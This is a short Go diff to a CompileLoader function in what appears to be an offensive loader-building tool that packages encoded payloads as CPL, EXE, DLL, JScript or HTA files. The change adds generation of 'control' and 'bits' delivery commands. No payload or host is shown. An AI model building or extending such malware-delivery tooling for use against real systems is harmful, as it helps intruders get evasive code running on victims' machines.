@@ -667,6 +667,10 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 			os.Rename(name+"/"+name+".cpl", name+".cpl")
 			os.RemoveAll(name)
 			fmt.Println("[+] " + name + ".cpl File Ready")
+			if CommandLoader == "control" {
+				outFile = name + ".cpl"
+				Utils.Command(URL, CommandLoader, outFile)
+			}
 			return
 		}
 	} else if mode == "wscript" {
@@ -676,6 +680,10 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 		os.Rename(name+"/"+name+".exe", name+".exe")
 		os.RemoveAll(name)
 		fmt.Println("[+] Binary Compiled")
+		if CommandLoader == "bits" {
+			outFile = name + ".exe"
+			Utils.Command(URL, CommandLoader, outFile)
+		}
 		return
 	} else if mode == "dll" {
 		os.Chdir("..")
@@ -692,7 +700,7 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 	content, _ := ioutil.ReadAll(reader)
 	encoded := base64.StdEncoding.EncodeToString(content)
 	finalcode := JScript_Buff(fso, dropPath, encoded, code, name, mode, sandbox)
-	Utils.Command(URL, CommandLoader, outFile)
+	URL = Utils.Command(URL, CommandLoader, outFile)
 	if CommandLoader == "hta" {
 		finalcode = HTA_Buff(finalcode)
 	}
@@ -704,5 +712,4 @@ func CompileLoader(mode string, outFile string, filename string, name string, Co
 	os.Rename(name+"/"+outFile, outFile)
 	os.RemoveAll(name)
 	fmt.Println("[+] Loader Compiled")
-
 }
